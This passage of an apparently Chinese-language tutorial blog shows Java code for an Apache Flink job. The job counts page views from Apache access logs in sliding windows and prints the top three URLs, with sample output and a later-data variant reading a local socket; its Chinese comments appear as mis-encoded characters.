class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> beans.ApacheLogEvent;</span><br><span class="line"><span class="keyword">import</span> beans.PageViewCount;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.compress.utils.Lists;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.functions.AggregateFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.ListState;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.ListStateDescriptor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.configuration.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.SingleOutputStreamOperator;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.KeyedProcessFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.timestamps.BoundedOutOfOrdernessTimestampExtractor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.windowing.WindowFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.assigners.SlidingEventTimeWindows;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.windows.TimeWindow;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.runtime.operators.util.AssignerWithPeriodicWatermarksAdapter;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.Collector;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.sql.Timestamp;</span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/5 1:27 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HotPages</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¯»å–æ–‡ä»¶ï¼Œè½¬æ¢æˆPOJO</span></span><br><span class="line">    URL resource = HotPages.class.getResource(<span class="string">&quot;/apache.log&quot;</span>);</span><br><span class="line">    DataStream&lt;String&gt; inputStream = env.readTextFile(resource.getPath());</span><br><span class="line"></span><br><span class="line">    DataStream&lt;ApacheLogEvent&gt; dataStream = inputStream</span><br><span class="line">      .map(line -&gt; &#123;</span><br><span class="line">        String[] fields = line.split(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        SimpleDateFormat simpleDateFormat = <span class="keyword">new</span> SimpleDateFormat(<span class="string">&quot;dd/MM/yyyy:HH:mm:ss&quot;</span>);</span><br><span class="line">        Long timestamp = simpleDateFormat.parse(fields[<span class="number">3</span>]).getTime();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ApacheLogEvent(fields[<span class="number">0</span>], fields[<span class="number">1</span>], timestamp, fields[<span class="number">5</span>], fields[<span class="number">6</span>]);</span><br><span class="line">      &#125;)</span><br><span class="line">      .assignTimestampsAndWatermarks(<span class="keyword">new</span> AssignerWithPeriodicWatermarksAdapter.Strategy&lt;&gt;(</span><br><span class="line">        <span class="keyword">new</span> BoundedOutOfOrdernessTimestampExtractor&lt;ApacheLogEvent&gt;(Time.of(<span class="number">1</span>, TimeUnit.SECONDS)) &#123;</span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line">          <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">extractTimestamp</span><span class="params">(ApacheLogEvent element)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> element.getTimestamp();</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      ));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆ†ç»„å¼€çª—èšåˆ</span></span><br><span class="line">    SingleOutputStreamOperator&lt;PageViewCount&gt; windowAggStream = dataStream</span><br><span class="line">      <span class="comment">// è¿‡æ»¤getè¯·æ±‚</span></span><br><span class="line">      .filter(data -&gt; <span class="string">&quot;GET&quot;</span>.equals(data.getMethod()))</span><br><span class="line">      .filter(data -&gt; &#123;</span><br><span class="line">        String regex = <span class="string">&quot;^((?!\\.(css|js|png|ico)$).)*$&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> Pattern.matches(regex, data.getUrl());</span><br><span class="line">      &#125;)</span><br><span class="line">      <span class="comment">// æŒ‰ç…§urlåˆ†ç»„</span></span><br><span class="line">      .keyBy(ApacheLogEvent::getUrl)</span><br><span class="line">      .window(SlidingEventTimeWindows.of(Time.minutes(<span class="number">10</span>), Time.seconds(<span class="number">5</span>)))</span><br><span class="line">      .aggregate(<span class="keyword">new</span> PageCountAgg(), <span class="keyword">new</span> PageCountResult());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ”¶é›†åŒä¸€çª—å£countæ•°æ®ï¼Œæ’åºè¾“å‡º</span></span><br><span class="line">    DataStream&lt;String&gt; resultStream = windowAggStream</span><br><span class="line">      .keyBy(PageViewCount::getWindowEnd)</span><br><span class="line">      .process(<span class="keyword">new</span> TopNHotPages(<span class="number">3</span>));</span><br><span class="line"></span><br><span class="line">    resultStream.print();</span><br><span class="line"></span><br><span class="line">    env.execute(<span class="string">&quot;hot pages job&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// è‡ªå®šä¹‰é¢„èšåˆå‡½æ•°</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">PageCountAgg</span> <span class="keyword">implements</span> <span class="title">AggregateFunction</span>&lt;<span class="title">ApacheLogEvent</span>, <span class="title">Long</span>, <span class="title">Long</span>&gt; </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">createAccumulator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">add</span><span class="params">(ApacheLogEvent value, Long accumulator)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> accumulator + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">getResult</span><span class="params">(Long accumulator)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> accumulator;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">merge</span><span class="params">(Long a, Long b)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> a + b;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å®ç°è‡ªå®šä¹‰çš„çª—å£å‡½æ•°</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">PageCountResult</span> <span class="keyword">implements</span> <span class="title">WindowFunction</span>&lt;<span class="title">Long</span>, <span class="title">PageViewCount</span>, <span class="title">String</span>, <span class="title">TimeWindow</span>&gt; </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">apply</span><span class="params">(String url, TimeWindow window, Iterable&lt;Long&gt; input, Collector&lt;PageViewCount&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      out.collect(<span class="keyword">new</span> PageViewCount(url, window.getEnd(), input.iterator().next()));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å®ç°è‡ªå®šä¹‰çš„å¤„ç†å‡½æ•°</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">TopNHotPages</span> <span class="keyword">extends</span> <span class="title">KeyedProcessFunction</span>&lt;<span class="title">Long</span>, <span class="title">PageViewCount</span>, <span class="title">String</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Integer topSize;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TopNHotPages</span><span class="params">(Integer topSize)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.topSize = topSize;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å®šä¹‰çŠ¶æ€ï¼Œä¿å­˜å½“å‰æ‰€æœ‰PageViewCountåˆ°listä¸­</span></span><br><span class="line">    ListState&lt;PageViewCount&gt; pageViewCountListState;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">(Configuration parameters)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      pageViewCountListState = getRuntimeContext().getListState(<span class="keyword">new</span> ListStateDescriptor&lt;PageViewCount&gt;(<span class="string">&quot;page-count-list&quot;</span>, PageViewCount.class));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processElement</span><span class="params">(PageViewCount value, Context ctx, Collector&lt;String&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      pageViewCountListState.add(value);</span><br><span class="line">      ctx.timerService().registerEventTimeTimer(value.getWindowEnd() + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onTimer</span><span class="params">(<span class="keyword">long</span> timestamp, OnTimerContext ctx, Collector&lt;String&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      ArrayList&lt;PageViewCount&gt; pageViewCounts = Lists.newArrayList(pageViewCountListState.get().iterator());</span><br><span class="line"></span><br><span class="line">      pageViewCounts.sort((a, b) -&gt; -Long.compare(a.getCount(), b.getCount()));</span><br><span class="line"></span><br><span class="line">      <span class="comment">// æ ¼å¼åŒ–æˆStringè¾“å‡º</span></span><br><span class="line">      StringBuilder resultBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">      resultBuilder.append(<span class="string">&quot;============================&quot;</span>).append(System.lineSeparator());</span><br><span class="line">      resultBuilder.append(<span class="string">&quot;çª—å£ç»“æŸæ—¶é—´ï¼š&quot;</span>).append(<span class="keyword">new</span> Timestamp(timestamp - <span class="number">1</span>)).append(System.lineSeparator());</span><br><span class="line"></span><br><span class="line">      <span class="comment">// éå†åˆ—è¡¨ï¼Œå–top nè¾“å‡º</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; Math.min(topSize, pageViewCounts.size()); i++) &#123;</span><br><span class="line">        PageViewCount pageViewCount = pageViewCounts.get(i);</span><br><span class="line">        resultBuilder.append(<span class="string">&quot;NO &quot;</span>).append(i + <span class="number">1</span>).append(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">          .append(<span class="string">&quot; é¡µé¢URL = &quot;</span>).append(pageViewCount.getUrl())</span><br><span class="line">          .append(<span class="string">&quot; æµè§ˆé‡ = &quot;</span>).append(pageViewCount.getCount())</span><br><span class="line">          .append(System.lineSeparator());</span><br><span class="line">      &#125;</span><br><span class="line">      resultBuilder.append(<span class="string">&quot;===============================&quot;</span>).append(System.lineSeparator());</span><br><span class="line"></span><br><span class="line">      <span class="comment">// æ§åˆ¶è¾“å‡ºé¢‘ç‡</span></span><br><span class="line">      Thread.sleep(<span class="number">1000L</span>);</span><br><span class="line"></span><br><span class="line">      out.collect(resultBuilder.toString());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> è¾“å‡ºç»“æœ  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">....</span><br><span class="line"></span><br><span class="line">============================</span><br><span class="line">çª—å£ç»“æŸæ—¶é—´ï¼š2015-05-17 10:05:25.0</span><br><span class="line">NO 1: é¡µé¢URL = /blog/tags/puppet?flav=rss20 æµè§ˆé‡ = 2</span><br><span class="line">NO 2: é¡µé¢URL = /blog/geekery/eventdb-ideas.html æµè§ˆé‡ = 1</span><br><span class="line">NO 3: é¡µé¢URL = /blog/geekery/installing-windows-8-consumer-preview.html æµè§ˆé‡ = 1</span><br><span class="line">===============================</span><br><span class="line"></span><br><span class="line">============================</span><br><span class="line">çª—å£ç»“æŸæ—¶é—´ï¼š2015-05-17 10:05:30.0</span><br><span class="line">NO 1: é¡µé¢URL = /blog/tags/puppet?flav=rss20 æµè§ˆé‡ = 2</span><br><span class="line">NO 2: é¡µé¢URL = /blog/geekery/eventdb-ideas.html æµè§ˆé‡ = 1</span><br><span class="line">NO 3: é¡µé¢URL = /blog/geekery/installing-windows-8-consumer-preview.html æµè§ˆé‡ = 1</span><br><span class="line">===============================</span><br><span class="line"></span><br><span class="line">============================</span><br><span class="line">çª—å£ç»“æŸæ—¶é—´ï¼š2015-05-17 10:05:35.0</span><br><span class="line">NO 1: é¡µé¢URL = /blog/tags/puppet?flav=rss20 æµè§ˆé‡ = 2</span><br><span class="line">NO 2: é¡µé¢URL = /blog/tags/firefox?flav=rss20 æµè§ˆé‡ = 2</span><br><span class="line">NO 3: é¡µé¢URL = /blog/geekery/eventdb-ideas.html æµè§ˆé‡ = 1</span><br><span class="line">===============================</span><br><span class="line"></span><br><span class="line">....</span><br></pre></td></tr></table></figure></li></ul><h6 id="ä»£ç 2-ä¹±åºæ•°æ®æµ‹è¯•"><a href="#ä»£ç 2-ä¹±åºæ•°æ®æµ‹è¯•" class="headerlink" title="ä»£ç 2-ä¹±åºæ•°æ®æµ‹è¯•"></a>ä»£ç 2-ä¹±åºæ•°æ®æµ‹è¯•</h6><ul><li><p> javaä»£ç   </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> beans.ApacheLogEvent;</span><br><span class="line"><span class="keyword">import</span> beans.PageViewCount;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.compress.utils.Lists;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.functions.AggregateFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.ListState;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.ListStateDescriptor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.configuration.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.SingleOutputStreamOperator;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.KeyedProcessFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.timestamps.BoundedOutOfOrdernessTimestampExtractor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.windowing.WindowFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.assigners.SlidingEventTimeWindows;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.windows.TimeWindow;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.runtime.operators.util.AssignerWithPeriodicWatermarksAdapter;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.Collector;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.OutputTag;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.sql.Timestamp;</span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/5 1:27 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HotPages</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¯»å–æ–‡ä»¶ï¼Œè½¬æ¢æˆPOJO</span></span><br><span class="line">    <span class="comment">//        URL resource = HotPages.class.getResource(&quot;/apache.log&quot;);</span></span><br><span class="line">    <span class="comment">//        DataStream&lt;String&gt; inputStream = env.readTextFile(resource.getPath());</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ–¹ä¾¿æµ‹è¯•ï¼Œä½¿ç”¨æœ¬åœ°Socketè¾“å…¥æ•°æ®</span></span><br><span class="line">    DataStream&lt;String&gt; inputStream = env.socketTextStream(<span class="string">&quot;localhost&quot;</span>, <span class="number">7777</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    DataStream&lt;ApacheLogEvent&gt; dataStream = inputStream</span><br><span class="line">      .map(line -&gt; &#123;</span><br><span class="line">        String[] fields = line.split(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        SimpleDateFormat simpleDateFormat = <span class="keyword">new</span> SimpleDateFormat(<span class="string">&quot;dd/MM/yyyy:HH:mm:ss&quot;</span>);</span><br><span class="line">        Long timestamp = simpleDateFormat.parse(fields[<span class="number">3</span>]).getTime();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ApacheLogEvent(fields[<span class="number">0</span>], fields[<span class="number">1</span>], timestamp, fields[<span class="number">5</span>], fields[<span class="number">6</span>]);</span><br><span class="line">      &#125;)</span><br><span class="line">      .assignTimestampsAndWatermarks(<span class="keyword">new</span> AssignerWithPeriodicWatermarksAdapter.Strategy&lt;&gt;(</span><br><span class="line">        <span class="keyword">new</span> BoundedOutOfOrdernessTimestampExtractor&lt;ApacheLogEvent&gt;(Time.of(<span class="number">1</span>, TimeUnit.SECONDS)) &#123;</span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line">          <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">extractTimestamp</span><span class="params">(ApacheLogEvent element)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> element.getTimestamp();</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      ));</span><br><span class="line"></span><br><span class="line">    dataStream.print(<span class="string">&quot;data&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// å®šä¹‰ä¸€ä¸ªä¾§è¾“å‡ºæµæ ‡ç­¾</span></span><br><span class="line">    OutputTag&lt;ApacheLogEvent&gt; lateTag = <span class="keyword">new</span> OutputTag&lt;ApacheLogEvent&gt;(<span class="string">&quot;late&quot;</span>)&#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆ†ç»„å¼€çª—èšåˆ</span></span><br><span class="line">    SingleOutputStreamOperator&lt;PageViewCount&gt; windowAggStream = dataStream</span><br><span class="line">      <span class="comment">// è¿‡æ»¤getè¯·æ±‚</span></span><br><span class="line">      .filter(data -&gt; <span class="string">&quot;GET&quot;</span>.equals(data.getMethod()))</span><br><span class="line">      .filter(data -&gt; &#123;</span><br><span class="line">        String regex = <span class="string">&quot;^((?!\\.(css|js|png|ico)$).)*$&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> Pattern.matches(regex, data.getUrl());</span><br><span class="line">      &#125;)</span><br><span class="line">      <span class="comment">// æŒ‰ç…§urlåˆ†ç»„</span></span><br><span class="line">      .keyBy(ApacheLogEvent::getUrl)</span><br><span class="line">      .window(SlidingEventTimeWindows.of(Time.minutes(<span class="number">10</span>), Time.seconds(<span class="number">5</span>)))</span><br><span class="line">      .allowedLateness(Time.minutes(<span class="number">1</span>))</span><br><span class="line">      .sideOutputLateData(lateTag)</span><br><span class="line">      .aggregate(<span class="keyword">new</span> PageCountAgg(), <span class="keyword">new</span> PageCountResult());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    windowAggStream.print(<span class="string">&quot;agg&quot;</span>);</span><br><span class="line">    windowAggStream.getSideOutput(lateTag).print(<span class="string">&quot;late&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ”¶é›†åŒä¸€çª—å£countæ•°æ®ï¼Œæ’åºè¾“å‡º</span></span><br><span class="line">    